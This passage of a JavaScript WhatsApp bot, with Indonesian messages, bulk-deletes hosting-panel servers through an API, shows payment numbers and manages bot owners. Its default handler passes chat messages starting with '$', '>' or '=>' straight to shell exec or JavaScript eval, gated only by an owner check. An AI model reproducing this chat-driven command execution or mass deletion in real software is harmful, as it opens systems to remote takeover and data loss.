                    "Authorization": "Bearer " + apikey,
                }
            })

            if (deleteServer.ok) {
                deletedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            } else {
                failedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            }
        }

        let message = "*Hasil Penghapusan Server:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedServers.length} Server*`
        if (deletedServers.length > 0) {
            message += `\n${deletedServers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedServers.length} Server*`
        if (failedServers.length > 0) {
            message += `\n${failedServers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('❌ Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearserverv2':
case 'clearpanelv2': {
    if (!isCreator) return syahreply(mess.owner)
    
    const argsString = body.trim()
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludedIds.length === 0) {
        return syahreply(`Masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: *${prefix+command}* , 48, 49, 50`)
    }

    try {
        syahreply("Proses penghapusan server 🚀")

        let servers = []
        let page = 1

       
        while (true) {
            let f = await fetch(`${domain2}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break

            servers.push(...res.data)
            page++
        }

        if (servers.length === 0) {
            return syahreply('❌ Tidak ada server yang ditemukan.')
        }

        let deletedServers = []
        let failedServers = []

        for (let server of servers) {
            let s = server.attributes

            if (excludedIds.includes(s.id.toString())) {
                continue
            }

            let deleteServer = await fetch(`${domain2}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2,
                }
            })

            if (deleteServer.ok) {
                deletedServers.push(`• ID: ${s.id} (${s.name})`)
            } else {
                failedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            }
        }

        let message = "*Hasil Penghapusan Server:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedServers.length} Server*`
        if (deletedServers.length > 0) {
            message += `\n${deletedServers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedServers.length} Server*`
        if (failedServers.length > 0) {
            message += `\n${failedServers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('❌ Terjadi kesalahan: ' + error.message)
    }
}
break
    case 'clearserverv3':
case 'clearpanelv3': {
    if (!isCreator) return syahreply(mess.owner)
    
    const argsString = body.trim()
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludedIds.length === 0) {
        return syahreply(`Masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: *${prefix+command}* , 48, 49, 50`)
    }

    try {
        syahreply("Proses penghapusan server 🚀")

        let servers = []
        let page = 1

       
        while (true) {
            let f = await fetch(`${domain3}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey3,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break

            servers.push(...res.data)
            page++
        }

        if (servers.length === 0) {
            return syahreply('❌ Tidak ada server yang ditemukan.')
        }

        let deletedServers = []
        let failedServers = []

        for (let server of servers) {
            let s = server.attributes

            if (excludedIds.includes(s.id.toString())) {
                continue
            }

            let deleteServer = await fetch(`${domain3}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey3,
                }
            })

            if (deleteServer.ok) {
                deletedServers.push(`• ID: ${s.id} (${s.name})`)
            } else {
                failedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            }
        }

        let message = "*Hasil Penghapusan Server:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedServers.length} Server*`
        if (deletedServers.length > 0) {
            message += `\n${deletedServers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedServers.length} Server*`
        if (failedServers.length > 0) {
            message += `\n${failedServers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('❌ Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearserverv4':
case 'clearpanelv4': {
    if (!isCreator) return syahreply(mess.owner)
    
    const argsString = body.trim()
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludedIds.length === 0) {
        return syahreply(`Masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: *${prefix+command}* , 48, 49, 50`)
    }

    try {
        syahreply("Proses penghapusan server 🚀")

        let servers = []
        let page = 1

       
        while (true) {
            let f = await fetch(`${domain4}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey4,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break

            servers.push(...res.data)
            page++
        }

        if (servers.length === 0) {
            return syahreply('❌ Tidak ada server yang ditemukan.')
        }

        let deletedServers = []
        let failedServers = []

        for (let server of servers) {
            let s = server.attributes

            if (excludedIds.includes(s.id.toString())) {
                continue
            }

            let deleteServer = await fetch(`${domain4}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey4,
                }
            })

            if (deleteServer.ok) {
                deletedServers.push(`• ID: ${s.id} (${s.name})`)
            } else {
                failedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            }
        }

        let message = "*Hasil Penghapusan Server:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedServers.length} Server*`
        if (deletedServers.length > 0) {
            message += `\n${deletedServers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedServers.length} Server*`
        if (failedServers.length > 0) {
            message += `\n${failedServers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('❌ Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearserverv5':
case 'clearpanelv5': {
    if (!isCreator) return syahreply(mess.owner)
    
    const argsString = body.trim()
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludedIds.length === 0) {
        return syahreply(`Masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: *${prefix+command}* , 48, 49, 50`)
    }

    try {
        syahreply("Proses penghapusan server 🚀")

        let servers = []
        let page = 1

       
        while (true) {
            let f = await fetch(`${domain5}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey5,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break

            servers.push(...res.data)
            page++
        }

        if (servers.length === 0) {
            return syahreply('❌ Tidak ada server yang ditemukan.')
        }

        let deletedServers = []
        let failedServers = []

        for (let server of servers) {
            let s = server.attributes

            if (excludedIds.includes(s.id.toString())) {
                continue
            }

            let deleteServer = await fetch(`${domain5}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey5,
                }
            })

            if (deleteServer.ok) {
                deletedServers.push(`• ID: ${s.id} (${s.name})`)
            } else {
                failedServers.push(`• ID: ${s.id} (*${s.name}*)`)
            }
        }

        let message = "*Hasil Penghapusan Server:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedServers.length} Server*`
        if (deletedServers.length > 0) {
            message += `\n${deletedServers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedServers.length} Server*`
        if (failedServers.length > 0) {
            message += `\n${failedServers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('❌ Terjadi kesalahan: ' + error.message)
    }
}
break
case 'ping': {
  const os = require('os')
  const nou = require('node-os-utils')

  function formatp(bytes) {
    if (bytes < 1024) return `${bytes} B`
    const kb = bytes / 1024
    if (kb < 1024) return `${kb.toFixed(2)} KB`
    const mb = kb / 1024
    if (mb < 1024) return `${mb.toFixed(2)} MB`
    const gb = mb / 1024
    return `${gb.toFixed(2)} GB`
  }

  async function getServerInfo() {
    try {
      const osType = nou.os.type()
      const release = os.release()
      const arch = os.arch()
      const nodeVersion = process.version
      const ip = await nou.os.ip()

      const cpus = os.cpus()
      const cpuModel = cpus[0].model
      const coreCount = cpus.length
      const cpu = cpus.reduce((acc, cpu) => {
        acc.total += Object.values(cpu.times).reduce((a, b) => a + b, 0)
        acc.speed += cpu.speed
        acc.times.user += cpu.times.user
        acc.times.nice += cpu.times.nice
        acc.times.sys += cpu.times.sys
        acc.times.idle += cpu.times.idle
        acc.times.irq += cpu.times.irq
        return acc
      }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } })
      const cpuUsage = ((cpu.times.user + cpu.times.sys) / cpu.total * 100).toFixed(2) + '%'
      const loadAverage = os.loadavg()
      const totalMem = os.totalmem()
      const freeMem = os.freemem()
      const usedMem = totalMem - freeMem
      const storageInfo = await nou.drive.info()
      const speed = require('performance-now')
      const timestamp = speed()
      const latensi = speed() - timestamp
      let responseText = 
`*🤖 Info Bot :*
⚡ Ping: *${latensi.toFixed(4)} detik*

*🖥️ Info Server :*
• Versi Node.js: *${nodeVersion}*
• CPU: *${cpuModel}* (${coreCount} Core)
• Beban CPU: *${cpuUsage}*
• Uptime: *${runtime(os.uptime())}*
• Uptime Bot: *${formatRuntime(process.uptime())}*

*💾 RAM :*
• Total: *${formatp(totalMem)}*
• Digunakan: *${formatp(usedMem)}*
• Tersedia: *${formatp(freeMem)}*

*🗄️ Penyimpanan :*
• Total: *${storageInfo.totalGb} GB*
• Digunakan: *${storageInfo.usedGb} GB* (*${storageInfo.usedPercentage}%*)
• Tersedia: *${storageInfo.freeGb} GB* (*${storageInfo.freePercentage}%*)`
      return responseText.trim()
    } catch (error) {
      console.error('Error mendapatkan informasi server:', error)
      return 'Terjadi kesalahan dalam mendapatkan informasi server.'
    }
  }

  getServerInfo().then(responseText => {
    syah.sendMessage(m.chat, { text: responseText }, { quoted: qtext })
  })
}
break
case "dana": {
  if (!isCreator) return

  let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`

  let msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender]
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"Copy DANA","id":"danabtn","copy_code":"${global.dana}"}`
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext })

  await syah.relayMessage(m.chat, msgii.message, {
    messageId: msgii.key.id
  })
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
let msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender]
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"Copy DANA","id":"danabtn","copy_code":"${global.ovo}"}`
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext })

  await syah.relayMessage(m.chat, msgii.message, {
    messageId: msgii.key.id
  })
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
let msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender]
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"Copy DANA","id":"danabtn","copy_code":"${global.gopay}"}`
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext })

  await syah.relayMessage(m.chat, msgii.message, {
    messageId: msgii.key.id
  })
}
break;
case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("JASA OPEN BO 🗿"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await syah.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: global.channel,
}}}, {quoted: qtext})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("DONE BUY CPANEL"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await syah.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `TRANSAKSI BERJALAN DENGAN LANCAR DAN TELAH SELESAI`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: global.channel,
}}}, {quoted: qtext})
}
break
case "addown": case "addowner": {
    if (!isCreator) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi Owner installpanel!!

✨ Keuntungan yang Anda dapatkan:
🔹 bisa install panel sepuasnya tanpa harus manual
🔹 Mendapat hak istimewa sebagai Owner 🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;

case "delown": case "delowner": {
    if (!isCreator) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada owner tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus owner ${input2}!*`);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //
case "public": 
case "self": {
    if (!isCreator) return;
    if (command === "public") {
        syah.public = true;
        await syahreply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Public*.");
    } else if (command === "self") {
        syah.public = false;
        await syahreply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Self*.");
    }
}
break;        
        
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if(err) return syah.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return syah.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isCreator) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return syah.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return syah.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isCreator) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
syah.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
syah.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
syah.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})